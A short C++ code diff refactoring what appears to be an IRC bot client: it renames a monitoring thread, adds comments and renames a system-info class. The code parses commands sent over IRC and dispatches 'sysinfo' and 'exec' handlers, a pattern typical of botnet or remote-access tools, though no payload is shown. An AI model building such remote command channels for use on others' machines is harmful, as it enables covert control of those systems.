@@ -42,11 +42,11 @@ void IRCManager::stop() {
 }
 
 HANDLE IRCManager::startThread() {
-	hThread = (HANDLE)_beginthread(monitor, 0, this);
+	hThread = (HANDLE)_beginthread(monitorIRC, 0, this);
 	return hThread;
 }
 
-void monitor(void* i) {
+void monitorIRC(void* i) {
 	IRCClient* ircc = (IRCClient*)((IRCManager*)i)->ircc;
 	std::string data;
 	data = ircc->readRaw();
@@ -54,7 +54,10 @@ void monitor(void* i) {
 
 	while(true) {
 		data = ircc->readRaw();
+
+		// Check if connection was lost
 		if(data.empty()) {
+			// Close connections and exit
 			((IRCManager*)i)->stop();
 			return;
 		}
@@ -66,8 +69,6 @@ void monitor(void* i) {
 	}
 }
 
-
-// TODO: refactor into parseData for all data, parseCommand for commands
 void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 	std::string prefix;
 	std::string command;
@@ -116,7 +117,7 @@ void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 std::string executeCommand(std::string command, std::string args) {
 	std::string result;
 	if(!command.compare("sysinfo")) {
-		result = OSInfo::sysInfoStr();
+		result = SysInfo::sysInfoStr();
 	}
 
 	if(!command.compare("exec")) {
